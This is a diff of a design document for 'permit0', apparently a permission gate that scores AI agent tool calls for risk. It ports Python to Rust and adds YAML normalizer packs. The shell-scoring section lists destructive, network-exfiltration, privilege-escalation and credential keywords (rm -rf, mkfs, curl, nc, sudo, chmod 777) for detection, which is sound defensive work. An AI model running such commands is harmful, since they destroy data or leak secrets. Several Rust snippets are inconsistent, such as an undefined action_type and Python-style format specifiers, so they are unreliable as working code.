-    #  Flag             Weight   Category   Rationale
-    "DESTRUCTION":      0.28,  # Power      Catastrophic, hard to undo
-    "PHYSICAL":         0.26,  # Control    Real-world effects, hardest to reverse
-    "EXECUTION":        0.22,  # Control    Arbitrary code — a force multiplier
-    "PRIVILEGE":        0.20,  # Power      Cascades to everything else
-    "FINANCIAL":        0.20,  # Power      Direct liability
-    "EXPOSURE":         0.16,  # Data       Severity depends on what is exposed
-    "GOVERNANCE":       0.14,  # Control    Important but often recoverable
-    "OUTBOUND":         0.10,  # Data       Risky but common; context matters most
-    "MUTATION":         0.10,  # Data       Often reversible, scope-dependent
-}
+```rust
+/// Per-flag base weights (fractions of 1.0).
+/// NOT a probability distribution — multiple flags can fire simultaneously.
+/// Calibration question: "if only this flag fired with no amplifiers,
+/// what fraction of maximum risk does it represent?"
+pub const BASE_RISK_WEIGHTS: &[(&str, f64)] = &[
+    //  Flag             Weight   Category   Rationale
+    ("DESTRUCTION",      0.28),  // Power      Catastrophic, hard to undo
+    ("PHYSICAL",         0.26),  // Control    Real-world effects, hardest to reverse
+    ("EXECUTION",        0.22),  // Control    Arbitrary code — a force multiplier
+    ("PRIVILEGE",        0.20),  // Power      Cascades to everything else
+    ("FINANCIAL",        0.20),  // Power      Direct liability
+    ("EXPOSURE",         0.16),  // Data       Severity depends on what is exposed
+    ("GOVERNANCE",       0.14),  // Control    Important but often recoverable
+    ("OUTBOUND",         0.10),  // Data       Risky but common; context matters most
+    ("MUTATION",         0.10),  // Data       Often reversible, scope-dependent
+];
 
-# Flag categories and their scorer weights.
-# Control risks weighted most heavily — loss of safety mechanisms.
-CATEGORIES: dict[str, dict] = {
-    "data": {
-        "flags":  ["OUTBOUND", "EXPOSURE", "MUTATION"],
-        "amps":   ["sensitivity", "scope", "destination", "volume"],
-        "weight": 0.25,
-    },
-    "power": {
-        "flags":  ["DESTRUCTION", "PRIVILEGE", "FINANCIAL"],
-        "amps":   ["amount", "irreversibility", "boundary", "environment"],
-        "weight": 0.35,
-    },
-    "control": {
-        "flags":  ["EXECUTION", "PHYSICAL", "GOVERNANCE"],
-        "amps":   ["actor", "session", "scope", "environment"],
-        "weight": 0.40,
-    },
-}
+/// Flag categories and their scorer weights.
+/// Control risks weighted most heavily — loss of safety mechanisms.
+pub const CATEGORIES: &[(&str, CategoryConfig)] = &[
+    ("data",    CategoryConfig { flags: &["OUTBOUND", "EXPOSURE", "MUTATION"],
+                                  amps: &["sensitivity", "scope", "destination", "volume"],
+                                  weight: 0.25 }),
+    ("power",   CategoryConfig { flags: &["DESTRUCTION", "PRIVILEGE", "FINANCIAL"],
+                                  amps: &["amount", "irreversibility", "boundary", "environment"],
+                                  weight: 0.35 }),
+    ("control", CategoryConfig { flags: &["EXECUTION", "PHYSICAL", "GOVERNANCE"],
+                                  amps: &["actor", "session", "scope", "environment"],
+                                  weight: 0.40 }),
+];
 ```
 
 ### Amplifier Dimensions
 
-```python
-# AMP_WEIGHTS is a budget — MUST sum to exactly 1.0.
-# Raising one entry requires lowering another.
-AMP_WEIGHTS: dict[str, float] = {
-    "destination":     0.155,  # Where data/action is going — largest share
-    "sensitivity":     0.136,  # How sensitive the data is
-    "scope":           0.136,  # Breadth of impact
-    "amount":          0.117,  # Financial or quantitative magnitude
-    "session":         0.097,  # Persistence across sessions
-    "irreversibility": 0.097,  # Inability to undo
-    "volume":          0.078,  # Scale / frequency
-    "boundary":        0.078,  # Crossing trust boundaries
-    "actor":           0.058,  # Who is performing the action
-    "environment":     0.048,  # Prod > staging > test > dev
+```rust
+/// AMP_WEIGHTS is a budget — MUST sum to exactly 1.0.
+/// Raising one entry requires lowering another.
+pub const BASE_AMP_WEIGHTS: &[(&str, f64)] = &[
+    ("destination",     0.155),  // Where data/action is going — largest share
+    ("sensitivity",     0.136),  // How sensitive the data is
+    ("scope",           0.136),  // Breadth of impact
+    ("amount",          0.117),  // Financial or quantitative magnitude
+    ("session",         0.097),  // Persistence across sessions
+    ("irreversibility", 0.097),  // Inability to undo
+    ("volume",          0.078),  // Scale / frequency
+    ("boundary",        0.078),  // Crossing trust boundaries
+    ("actor",           0.058),  // Who is performing the action
+    ("environment",     0.048),  // Prod > staging > test > dev
+];
+// Sum must equal 1.0 — enforced at compile time.
+
+/// Raw integer ceilings — used only for normalisation.
+pub const AMP_MAXES: &[(&str, i32)] = &[
+    ("sensitivity",     35),
+    ("scope",           35),
+    ("boundary",        20),
+    ("amount",          30),
+    ("actor",           20),
+    ("destination",     40),
+    ("session",         30),
+    ("volume",          25),
+    ("irreversibility", 20),
+    ("environment",     15),
+];
+
+pub fn normalise_amps(amplifiers: &HashMap<String, i32>) -> HashMap<String, f64> {
+    AMP_MAXES.iter().map(|(dim, max)| {
+        let raw = amplifiers.get(*dim).copied().unwrap_or(0);
+        (dim.to_string(), (raw as f64 / *max as f64).clamp(0.0, 1.0))
+    }).collect()
 }
-assert abs(sum(AMP_WEIGHTS.values()) - 1.0) < 1e-9, "AMP_WEIGHTS must sum to 1.0"
-
-# Raw integer ceilings — used only for normalisation.
-AMP_MAXES: dict[str, int] = {
-    "sensitivity":     35,
-    "scope":           35,
-    "boundary":        20,
-    "amount":          30,
-    "actor":           20,
-    "destination":     40,
-    "session":         30,
-    "volume":          25,
-    "irreversibility": 20,
-    "environment":     15,
-}
-
-
-def normalise_amps(amplifiers: dict[str, int]) -> dict[str, float]:
-    """Convert raw integer amplifier inputs → 0.0–1.0 per dimension."""
-    return {
-        dim: max(0.0, min(amplifiers.get(dim, 0) / AMP_MAXES[dim], 1.0))
-        for dim in AMP_WEIGHTS
-    }
-```
-
-### Risk Template and Mutation API
-
-```python
-@dataclass
-class RiskTemplate:
-    flags:        dict[str, str]        # flag → "primary" | "secondary"
-    amplifiers:   dict[str, int]        # dimension → raw integer value
-    blocked:      bool       = False
-    block_reason: str | None = None
-    children:     list["RiskTemplate"] = dc_field(default_factory=list)
-
-    # ── Mutation API ──────────────────────────────────────────────────────────
-    # The ONLY way to modify a template. Never write to flags/amplifiers directly.
-
-    def add(self, flag: str, role: str = "primary") -> None:
-        """Add a flag if not already present."""
-        if flag not in self.flags:
-            self.flags[flag] = role
-
-    def remove(self, flag: str) -> None:
-        """Remove a flag entirely."""
-        self.flags.pop(flag, None)
-
-    def promote(self, flag: str) -> None:
-        """Upgrade flag role: secondary → primary."""
-        if flag in self.flags:
-            self.flags[flag] = "primary"
-
-    def demote(self, flag: str) -> None:
-        """Downgrade flag role: primary → secondary."""
-        if flag in self.flags:
-            self.flags[flag] = "secondary"
-
-    def upgrade(self, dim: str, delta: int) -> None:
-        """Increase an amplifier, capped at AMP_MAXES ceiling."""
-        self.amplifiers[dim] = min(
-            self.amplifiers.get(dim, 0) + delta,
-            AMP_MAXES[dim],
-        )
-
-    def downgrade(self, dim: str, delta: int) -> None:
-        """Decrease an amplifier, floored at 0."""
-        self.amplifiers[dim] = max(self.amplifiers.get(dim, 0) - delta, 0)
-
-    def override(self, dim: str, value: int) -> None:
-        """Set an amplifier to an exact value (clamped to valid range)."""
-        self.amplifiers[dim] = max(0, min(value, AMP_MAXES[dim]))
-
-    def gate(self, reason: str) -> None:
-        """Hard block — marks template as blocked regardless of score."""
-        self.blocked      = True
-        self.block_reason = reason
-
-    def split(self, child: "RiskTemplate") -> None:
-        """
-        Fork an independent child risk assessment.
-        compute_hybrid scores all children; final = max(self, children).
-        """
-        self.children.append(child)
 ```
 
 ### Hard Block Rules
 
-```python
-@dataclass
-class BlockRule:
-    name:      str
-    # Receives (active_flags, normalised_amps) — NOT raw integers.
-    # Thresholds are 0.0–1.0 so they are range-independent.
-    condition: Callable[[list[str], dict[str, float]], bool]
-    reason:    str
+Block rules are evaluated after template-level gates, before scoring. They operate on normalised amplifier values (0.0–1.0), not raw integers.
 
+| Rule name | Flags required | Amplifier thresholds | Reason |
+|---|---|---|---|
+| `irreversible_destruction` | DESTRUCTION | irreversibility >= 0.90 | Irreversible destruction exceeds tolerable threshold |
+| `financial_exfiltration` | FINANCIAL + OUTBOUND | amount >= 0.83, destination >= 0.75 | High-value outbound financial movement to untrusted destination |
+| `privileged_prod_execution` | EXECUTION + PRIVILEGE | environment >= 0.80, scope >= 0.80 | Arbitrary execution with elevated privilege in production scope |
+| `governance_trust_boundary` | GOVERNANCE | boundary >= 0.90 | Rule-change crossing a high trust boundary |
+| `classified_external_send` | OUTBOUND + EXPOSURE | sensitivity >= 0.94, destination >= 0.75 | Highly sensitive data sent to untrusted external destination |
 
-BLOCK_RULES: list[BlockRule] = [
-    BlockRule(
-        name="irreversible_destruction",
-        condition=lambda flags, norm: (
-            "DESTRUCTION" in flags
-            and norm.get("irreversibility", 0.0) >= 0.90        # ≥ 18/20
-        ),
-        reason="Irreversible destruction exceeds tolerable threshold",
-    ),
-    BlockRule(
-        name="financial_exfiltration",
-        condition=lambda flags, norm: (
-            "FINANCIAL" in flags
-            and "OUTBOUND" in flags
-            and norm.get("amount", 0.0)      >= 0.83            # ≥ 25/30
-            and norm.get("destination", 0.0) >= 0.75            # ≥ 30/40
-        ),
-        reason="High-value outbound financial movement to untrusted destination",
-    ),
-    BlockRule(
-        name="privileged_prod_execution",
-        condition=lambda flags, norm: (
-            "EXECUTION" in flags
-            and "PRIVILEGE" in flags
-            and norm.get("environment", 0.0) >= 0.80            # ≥ 12/15
-            and norm.get("scope", 0.0)       >= 0.80            # ≥ 28/35
-        ),
-        reason="Arbitrary execution with elevated privilege in production scope",
-    ),
-    BlockRule(
-        name="governance_trust_boundary",
-        condition=lambda flags, norm: (
-            "GOVERNANCE" in flags
-            and norm.get("boundary", 0.0) >= 0.90               # ≥ 18/20
-        ),
-        reason="Rule-change crossing a high trust boundary",
-    ),
-    BlockRule(
-        name="classified_external_send",
-        condition=lambda flags, norm: (
-            "OUTBOUND" in flags
-            and "EXPOSURE" in flags
-            and norm.get("sensitivity", 0.0) >= 0.94            # ≥ 33/35
-            and norm.get("destination", 0.0) >= 0.75            # ≥ 30/40
-        ),
-        reason="Highly sensitive data sent to untrusted external destination",
-    ),
-]
-```
+Block rules can be **added** by domain profiles and org policies. The five rules above are **immutable** — they cannot be removed or weakened by any configuration layer.
 
 ### Hybrid Scorer
 
@@ -730,18 +545,18 @@ Steps 1–2 are gates that return CRITICAL immediately. Steps 3–5 compute the 
 flowchart TD
     IN(["RiskTemplate<br/>flags + amplifiers"]) --> S1
 
-    S1{"Step 1 -- template gate<br/>t.blocked?"}
-    S1 -->|yes| CRIT1([CRITICAL -- return])
+    S1{"Step 1 — template gate<br/>t.blocked?"}
+    S1 -->|yes| CRIT1([CRITICAL — return])
     S1 -->|no| S2
 
-    S2{"Step 2 -- global block rules<br/>any fires?"}
-    S2 -->|yes| CRIT2([CRITICAL -- return])
-    S2 -->|no| NORM["normalise_amps<br/>raw int to 0.0-1.0"]
+    S2{"Step 2 — block rules<br/>per-call + session"}
+    S2 -->|yes| CRIT2([CRITICAL — return])
+    S2 -->|no| NORM["normalise_amps<br/>raw int → 0.0-1.0"]
 
-    NORM --> S3["Step 3 -- category base<br/>0.25 x data + 0.35 x power + 0.40 x control"]
-    S3   --> S4["Step 4 -- multiplicative<br/>irreversibility x boundary x destination"]
-    S4   --> S5["Step 5 -- additive boost<br/>remaining 7 amplifiers"]
-    S5   --> S6["Step 6 -- tanh squeeze<br/>tanh(x x 1.5) to [0, 1)"]
+    NORM --> S3["Step 3 — category base<br/>0.25 × data + 0.35 × power + 0.40 × control"]
+    S3   --> S4["Step 4 — multiplicative<br/>irreversibility × boundary × destination"]
+    S4   --> S5["Step 5 — additive boost<br/>remaining 7 amplifiers"]
+    S5   --> S6["Step 6 — tanh squeeze<br/>tanh(x × k) → [0, 1)"]
     S6   --> SPL["Resolve splits<br/>final = max(self, children)"]
 
     SPL --> R1(["raw  float  0.0-1.0<br/>math + composition"])
@@ -755,816 +570,950 @@ flowchart TD
     style R3 fill:#444441,color:#F1EFE8
 ```
 
-```python
-import math
+```rust
+const MULTIPLICATIVE_DIMS: &[&str] = &["irreversibility", "boundary", "destination"];
 
-MULTIPLICATIVE_DIMS = {"irreversibility", "boundary", "destination"}
-ADDITIVE_DIMS       = {d for d in AMP_WEIGHTS if d not in MULTIPLICATIVE_DIMS}
+pub fn compute_hybrid(t: &RiskTemplate, config: &ScoringConfig) -> RiskScore {
+    let active_flags: Vec<String> = t.flags.keys().cloned().collect();
+    let norm = normalise_amps(&t.amplifiers);
 
+    // Step 1 — template-level gate
+    if t.blocked {
+        return to_risk_score(1.0, active_flags,
+            t.block_reason.as_deref().unwrap_or("blocked by template gate"),
+            true, t.block_reason.clone());
+    }
 
-def _category_raw(
-    active_flags: list[str],
-    norm: dict[str, float],
-    cfg: dict,
-) -> float:
-    """Score a single flag category against its relevant amplifiers."""
-    base = sum(RISK_WEIGHTS[f] for f in active_flags if f in cfg["flags"])
-    if base == 0.0:
-        return 0.0
-    cat_w   = {d: AMP_WEIGHTS[d] for d in cfg["amps"]}
-    cat_sum = sum(cat_w.values())
-    amp     = sum((w / cat_sum) * norm[d] for d, w in cat_w.items())
-    return base * (1.0 + amp) / 2.0     # centred so max(base+amp) ≈ 1
+    // Step 2 — block rules (base + profile + org additions)
+    for rule in &config.block_rules {
+        if rule.matches(&active_flags, &norm) {
+            return to_risk_score(1.0, active_flags, &rule.reason,
+                true, Some(rule.reason.clone()));
+        }
+    }
 
+    // Step 3 — category-weighted base
+    let base: f64 = config.categories.iter().map(|cat| {
+        let flag_base: f64 = active_flags.iter()
+            .filter(|f| cat.flags.contains(&f.as_str()))
+            .map(|f| config.risk_weight(f))
+            .sum();
+        if flag_base == 0.0 { return 0.0; }
+        let cat_amps: Vec<(&str, f64)> = cat.amps.iter()
+            .map(|d| (*d, config.amp_weight(d)))
+            .collect();
+        let cat_sum: f64 = cat_amps.iter().map(|(_, w)| w).sum();
+        let amp: f64 = cat_amps.iter()
+            .map(|(d, w)| (w / cat_sum) * norm[*d])
+            .sum();
+        cat.weight * flag_base * (1.0 + amp) / 2.0
+    }).sum();
 
-def compute_hybrid(t: RiskTemplate) -> RiskScore:
-    """Score a (possibly mutated) RiskTemplate — see diagram above for steps."""
-    active_flags = list(t.flags.keys())
-    norm         = normalise_amps(t.amplifiers)
+    // Step 4 — multiplicative compound for high-stakes dims
+    let compound: f64 = MULTIPLICATIVE_DIMS.iter()
+        .map(|dim| 1.0 + config.amp_weight(dim) * norm[*dim])
+        .product();
 
-    # Step 1 — template-level gate
-    if t.blocked:
-        return to_risk_score(
-            1.0, active_flags,
-            t.block_reason or "blocked by template gate",
-            blocked=True, block_reason=t.block_reason,
-        )
+    // Step 5 — additive boost from remaining dims
+    let add_boost: f64 = AMP_WEIGHTS.iter()
+        .filter(|(d, _)| !MULTIPLICATIVE_DIMS.contains(d))
+        .map(|(d, _)| config.amp_weight(d) * norm[*d])
+        .sum();
 
-    # Step 2 — global block rules
-    for rule in BLOCK_RULES:
-        if rule.condition(active_flags, norm):
-            return to_risk_score(
-                1.0, active_flags, rule.reason,
-                blocked=True, block_reason=rule.reason,
-            )
+    let intermediate = base * compound * (1.0 + add_boost);
 
-    # Step 3 — category-weighted base
-    base = sum(
-        cfg["weight"] * _category_raw(active_flags, norm, cfg)
-        for cfg in CATEGORIES.values()
-    )
+    // Step 6 — tanh squeeze
+    let raw = (intermediate * config.tanh_k).tanh();
 
-    # Step 4 — multiplicative compound for high-stakes dims
-    # These three compound in reality: all three bad is far worse than any one.
-    compound = 1.0
-    for dim in MULTIPLICATIVE_DIMS:
-        compound *= (1.0 + AMP_WEIGHTS[dim] * norm[dim])
+    let reason = format!(
+        "flags={active_flags:?}, base={base:.3f}, compound={compound:.3f}, add_boost={add_boost:.3f}"
+    );
+    let mut score = to_risk_score(raw, active_flags, &reason, false, None);
 
-    # Step 5 — additive boost from remaining dims
-    add_boost = sum(AMP_WEIGHTS[d] * norm[d] for d in ADDITIVE_DIMS)
+    // Apply per-action-type floor if configured
+    if let Some(floor_tier) = config.action_type_floor(action_type) {
+        if score.tier < floor_tier {
+            score.tier = floor_tier;
+        }
+    }
 
-    intermediate = base * compound * (1.0 + add_boost)
+    // Resolve splits: final score = max(self, all children)
+    for child in &t.children {
+        let child_score = compute_hybrid(child, config);
+        if child_score.raw > score.raw {
+            score = child_score;
+        }
+    }
 
-    # Step 6 — tanh squeeze: maps [0, ∞) → [0, 1), with diminishing returns.
-    # Constant 1.5 is a sensitivity knob — tune via calibration.
-    raw = math.tanh(intermediate * 1.5)
-
-    reason = (
-        f"flags={active_flags}, base={base:.3f}, "
-        f"compound={compound:.3f}, add_boost={add_boost:.3f}"
-    )
-    score = to_risk_score(raw, active_flags, reason)
-
-    # Resolve splits: final score = max(self, all children)
-    for child in t.children:
-        child_score = compute_hybrid(child)
-        if child_score.raw > score.raw:
-            score = child_score
-
-    return score
+    score
+}
 ```
 
 ---
 
-## 6. Action Registry
+## 6. Normalizer Packs
 
-A raw tool call travels through the registry into a scored template. `mutate()` is the only place that reads entity field names. Two special operations branch off before the scorer: `gate()` for hard blocks and `split()` for independent child assessments.
+Packs are the primary contribution unit for permit0. Each pack is a bundle of YAML files that teach permit0 how to recognize and score tool calls for a specific vendor or integration.
 
-```mermaid
-flowchart TD
-    RAW([Raw action<br/>tool + arguments]) --> NORM[normalize_action<br/>domain.verb + entities]
-    NORM --> REG[ACTION_REGISTRY lookup<br/>action_type to base + mutate]
+A pack contains:
 
-    REG -->|registered| BASE[base()<br/>structural minimum template]
-    REG -->|unknown| BOOT([Bootstrap<br/>human review])
+1. **Normalizers** — YAML rules that match raw tool calls and map them to `NormAction` structs.
+2. **Risk rules** — YAML definitions of the base risk template and entity-driven mutation rules for each `action_type` the pack produces.
+3. **Fixtures** — test cases that verify normalizers and risk rules produce expected results.
 
-    BASE --> MUT[mutate(entities, t)<br/>field-driven rules]
+The full DSL specification is in [docs/dsl.md](dsl.md). This section covers the architecture and key concepts.
 
-    MUT -->|gate fires| BLOCK([CRITICAL<br/>return immediately])
-    MUT -->|split fires| CHILD[Child template<br/>score independently<br/>final = max(self, child)]
-    MUT --> TMPL[Mutated RiskTemplate<br/>flags + amplifiers]
+### Pack Structure
 
-    TMPL --> SCORER[compute_hybrid(t)<br/>6-step scorer]
-    SCORER --> RS([RiskScore])
-    RS --> PERM[tier_to_permission()]
-
-    PERM --> AL([Allow])
-    PERM --> AG([Agent loop])
-    PERM --> HU([Human loop])
-    PERM --> DN([Deny])
-
-    style BLOCK fill:#993C1D,color:#FAECE7
-    style BOOT fill:#993C1D,color:#FAECE7
-    style AL fill:#3B6D11,color:#EAF3DE
-    style AG fill:#185FA5,color:#E6F1FB
-    style HU fill:#BA7517,color:#FAEEDA
-    style DN fill:#993C1D,color:#FAECE7
+```
+packs/stripe/
+├── pack.yaml                              # manifest
+├── normalizers/
+│   ├── charges.create.norm.yaml           # normalizer for POST /v1/charges
+│   ├── charges.create.v2024-11-20.norm.yaml  # vendor API version variant
+│   ├── refunds.create.norm.yaml
+│   └── transfers.create.norm.yaml
+├── risk-rules/
+│   ├── payments.charge.risk.yaml          # risk rule for payments.charge
+│   ├── payments.refund.risk.yaml
+│   └── payments.transfer.risk.yaml
+└── fixtures/
+    ├── charges.create.fixtures.yaml
+    ├── refunds.create.fixtures.yaml
+    └── transfers.create.fixtures.yaml
 ```
 
-```python
-ActionHandler = tuple[
-    Callable[[], RiskTemplate],                    # base_fn
-    Callable[[dict, RiskTemplate], None],          # mutate_fn
-]
+### Pack Manifest
 
-ACTION_REGISTRY: dict[str, ActionHandler] = {}
+```yaml
+# packs/stripe/pack.yaml
+name: permit0-pack-stripe
+version: 0.3.1
+permit0_pack: v1
+description: Stripe payments integration
+vendor: stripe
 
+normalizers:
+  - normalizers/charges.create.norm.yaml
+  - normalizers/charges.create.v2024-11-20.norm.yaml
+  - normalizers/refunds.create.norm.yaml
+  - normalizers/transfers.create.norm.yaml
 
-def register(action_type: str):
-    """Decorator — @register("email.send") maps action_type to (base, mutate)."""
-    def decorator(cls):
-        ACTION_REGISTRY[action_type] = (cls.base, cls.mutate)
-        return cls
-    return decorator
-
-
-def assess(action_type: str, fields: dict) -> RiskScore:
-    """
-    Main scoring entry point.
-    fields is the entities dict from the normalized action,
-    plus org_domain and environment at the top level.
-    """
-    if action_type not in ACTION_REGISTRY:
-        raise ValueError(
-            f"Unknown action type: {action_type!r}. "
-            f"Registered: {sorted(ACTION_REGISTRY)}"
-        )
-    base_fn, mutate_fn = ACTION_REGISTRY[action_type]
-    t = base_fn()
-    mutate_fn(fields, t)
-    return compute_hybrid(t)
-
-
-# ── Shared helpers ────────────────────────────────────────────────────────────
-
-def _domain_of(email: str) -> str:
-    return email.split("@")[-1].lower() if "@" in email else ""
-
-def _contains_any(text: str, patterns: set[str]) -> bool:
-    t = text.lower()
-    return any(p in t for p in patterns)
-
-def _env_mutations(fields: dict, t: RiskTemplate) -> None:
-    env = fields.get("environment", "")
-    if env == "production":
-        t.override("environment", 15)
-    elif env in ("test", "staging", "dev"):
-        t.override("environment", 3)
+risk_rules:
+  - risk-rules/payments.charge.risk.yaml
+  - risk-rules/payments.refund.risk.yaml
+  - risk-rules/payments.transfer.risk.yaml
 ```
 
-### email.send
+### Normalizer YAML
 
-```python
-@register("email.send")
-class EmailSend:
+```yaml
+# packs/stripe/normalizers/charges.create.norm.yaml
+permit0_pack: v1
+id: stripe.charges.create
+priority: 100
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={
-                "OUTBOUND": "primary",    # every send crosses a boundary
-                "EXPOSURE": "primary",    # surfaces sender identity and content
-                "MUTATION": "secondary",  # leaves a record (sent folder, logs)
-            },
-            amplifiers={
-                "irreversibility": 16,   # cannot be recalled once sent
-                "boundary":        12,   # crosses at least one trust boundary
-                "destination":     20,   # unknown until recipient is seen
-                "sensitivity":     10,   # unknown until content is seen
-                "environment":     10,   # assumed production until stated
-                "session":          8,
-                "actor":            5,
-                "scope":            5,
-                "volume":           3,
-                "amount":           0,
-            },
-        )
+match:
+  all:
+    - tool: http
+    - arg.method: POST
+    - arg.url:
+        matches_url:
+          host: api.stripe.com
+          path: /v1/charges
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        scope       = fields.get("recipient_scope", "external")
-        body        = fields.get("body", "")
-        subject     = fields.get("subject", "")
-        attachments = fields.get("attachments", [])
-        n_recipients = fields.get("recipient_count", 1)
-        send_rate   = fields.get("send_rate_per_minute", 0)
-
-        FINANCIAL_PATTERNS  = {"invoice", "wire", "payment", "account number", "routing number"}
-        CREDENTIAL_PATTERNS = {"password", "secret", "api key", "token", "private key"}
-
-        # ── Recipient scope ───────────────────────────────────────────────────
-        if scope == "self":
-            t.remove("EXPOSURE")
-            t.downgrade("boundary", 10)
-            t.downgrade("destination", 12)
-        elif scope == "internal":
-            t.downgrade("destination", 12)
-            t.downgrade("boundary", 6)
-        else:  # external
-            t.upgrade("destination", 14)
-
-        # ── Reply context ─────────────────────────────────────────────────────
-        if fields.get("in_reply_to"):
-            t.downgrade("boundary", 5)
-
-        # ── Attachments ───────────────────────────────────────────────────────
-        if attachments:
-            t.upgrade("sensitivity", 12)
-
-        if any(a.get("classification") in ("confidential", "secret")
-               for a in attachments):
-            t.gate("Classified attachment to external or unknown recipient")
-            return   # no further mutations after a gate
-
-        # ── Body / subject content ────────────────────────────────────────────
-        full_text = f"{subject} {body}"
-        if _contains_any(full_text, FINANCIAL_PATTERNS):
-            t.add("FINANCIAL")
-            t.upgrade("amount", 18)
-
-        if _contains_any(full_text, CREDENTIAL_PATTERNS):
-            t.upgrade("sensitivity", 20)
-            t.promote("EXPOSURE")
-
-        # ── Recipient count ───────────────────────────────────────────────────
-        if n_recipients > 50:
-            t.upgrade("scope", 25)
-            t.add("GOVERNANCE", "secondary")
-        elif n_recipients > 10:
-            t.upgrade("scope", 12)
-
-        # ── Send rate ─────────────────────────────────────────────────────────
-        if send_rate > 10:
-            t.upgrade("volume", 18)
-            t.add("EXECUTION", "secondary")
-
-        # ── Forward leakage ───────────────────────────────────────────────────
-        org = fields.get("org_domain", "")
-        if (
-            fields.get("is_forward")
-            and org
-            and fields.get("original_sender_domain", "") == org
-            and scope == "external"
-        ):
-            child = EmailSend.base()
-            child.upgrade("destination", 20)
-            child.upgrade("sensitivity", 15)
-            child.add("EXPOSURE")
-            child.upgrade("irreversibility", 4)
-            t.split(child)
-
-        _env_mutations(fields, t)
+normalize:
+  action_type: payments.charge
+  domain:      payments
+  verb:        charge
+  channel:     stripe
+  entities:
+    amount:
+      from: arg.body.amount
+      type: int
+      required: true
+    currency:
+      from: arg.body.currency
+      type: string
+      default: usd
+      lowercase: true
+    customer:
+      from: arg.body.customer
+      type: string
+      optional: true
+    destination_scope:
+      compute: classify_destination
+      args: [arg.body.destination.account, ctx.org_stripe_account_id]
 ```
 
-### email.forward
+### API Version Handling
 
-```python
-@register("email.forward")
-class EmailForward:
+Vendor APIs evolve. Packs handle this with version-aware normalizers:
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        # Higher base than email.send — original content is re-exposed
-        t = EmailSend.base()
-        t.override("destination", 28)
-        t.override("sensitivity", 18)
-        return t
+```yaml
+# packs/stripe/normalizers/charges.create.v2024-11-20.norm.yaml
+permit0_pack: v1
+id: stripe.charges.create@2024-11-20
+extends: ./charges.create.norm.yaml
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        # All email.send mutations apply
-        EmailSend.mutate(fields, t)
+api_version:
+  vendor: stripe
+  range: ">=2024-11-20"
+  detected_from: arg.headers.Stripe-Version
 
-        # Plus: internal→external forward is the canonical leakage vector
-        org   = fields.get("org_domain", "")
-        scope = fields.get("recipient_scope", "external")
-        orig_domain = fields.get("original_sender_domain", "")
-
-        if org and orig_domain == org and scope == "external":
-            t.upgrade("destination", 14)
-            t.upgrade("sensitivity", 10)
-            t.add("GOVERNANCE", "secondary")
+# Only the fields that changed
+normalize:
+  entities:
+    payment_source:
+      from: arg.body.payment_method    # was arg.body.source
 ```
 
-### process.shell
+Rules:
 
-```python
-@register("process.shell")
-class ProcessShell:
+- Both versions ship in the same pack. The dispatcher picks the right one at match time by checking `api_version.range` against the detected version header.
+- Both produce the **same `action_type`** and the **same entity shape**. Vendor field moves are hidden from the scorer.
+- Unknown versions route to an explicit per-vendor fallback (not to generic unknown).
+- Old versions have a `sunset` date; past sunset they warn but still work. Removal only happens in a major permit0 release.
 
-    DESTRUCTIVE = {"rm -rf", "drop table", "shred", "mkfs", "truncate"}
-    NETWORK_OUT = {"curl", "wget", "scp", "rsync", " nc ", "ncat", "ssh "}
-    PRIVILEGE   = {"sudo", "su ", "chmod 777", "chown root", "setuid"}
-    SENSITIVE   = {"password", "secret", "token", "private_key", "credentials"}
-    FINANCIAL   = {"stripe", "payment", "invoice", "wire", "transfer"}
+### Normalizer Dispatch
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={
-                "EXECUTION": "primary",   # arbitrary shell logic always runs
-                "MUTATION":  "primary",   # filesystem or process state may change
-            },
-            amplifiers={
-                "irreversibility": 10,
-                "boundary":         8,
-                "destination":      5,
-                "sensitivity":      8,
-                "environment":     10,
-                "session":         10,
-                "actor":            8,
-                "scope":           10,
-                "volume":           5,
-                "amount":           0,
-            },
-        )
+```rust
+pub trait Normalizer: Send + Sync {
+    fn id(&self) -> &str;
+    fn priority(&self) -> i32;
+    fn matches(&self, raw: &RawToolCall) -> bool;
+    fn normalize(&self, raw: &RawToolCall, ctx: &NormalizeCtx)
+        -> Result<NormAction, NormalizeError>;
+}
 
-    @staticmethod
-    def mutate(fields: dict, t: RiskTemplate) -> None:
-        command = fields.get("command", "").lower()
-
-        if _contains_any(command, ProcessShell.DESTRUCTIVE):
-            t.add("DESTRUCTION")
-            t.upgrade("irreversibility", 10)
-
-        if _contains_any(command, ProcessShell.NETWORK_OUT):
-            t.add("OUTBOUND")
-            t.upgrade("destination", 15)
-            t.upgrade("boundary", 8)
-
-        if _contains_any(command, ProcessShell.PRIVILEGE):
-            t.add("PRIVILEGE")
-            t.upgrade("scope", 15)
-            t.upgrade("actor", 10)
-
-        if _contains_any(command, ProcessShell.SENSITIVE):
-            t.add("EXPOSURE")
-            t.upgrade("sensitivity", 20)
-
-        if _contains_any(command, ProcessShell.FINANCIAL):
-            t.add("FINANCIAL")
-            t.upgrade("amount", 15)
-
-        # Chained commands have harder-to-predict blast radius
-        pipe_count = command.count("|") + command.count(";") + command.count("&&")
-        if pipe_count >= 3:
-            t.upgrade("scope", 8)
-            t.upgrade("irreversibility", 4)
-
-        if fields.get("environment") == "production":
-            t.override("environment", 15)
-            t.upgrade("scope", 8)   # prod multiplies blast radius
-        elif fields.get("environment") in ("test", "staging", "dev"):
-            t.override("environment", 3)
+pub struct NormalizerRegistry {
+    by_priority: Vec<Arc<dyn Normalizer>>,  // highest priority first
+    fallback:    Arc<dyn Normalizer>,        // bash/unknown, priority 0
+}
 ```
 
-### files.write
+- Higher priority number = checked earlier.
+- If two normalizers match at the same priority, that's a registration-time error.
+- The DSL-loaded YAML normalizer implements the `Normalizer` trait via `DslNormalizer`.
 
-```python
-@register("files.write")
-class FilesWrite:
+### Fixtures
 
-    SYSTEM_PATHS   = {"/etc/", "/bin/", "/usr/", "/boot/", "/sys/", "/proc/"}
-    SENSITIVE_KEYS = {"password", "secret", "token", "api_key", "private_key"}
+Every pack must ship fixtures. CI runs `permit0 pack test packs/**` on every PR.
 
-    @staticmethod
-    def base() -> RiskTemplate:
-        return RiskTemplate(
-            flags={"MUTATION": "primary"},
-            amplifiers={
-                "irreversibility":  8,
-                "boundary":         4,
-                "destination":      8,
-                "sensitivity":      8,
-                "environment":     10,
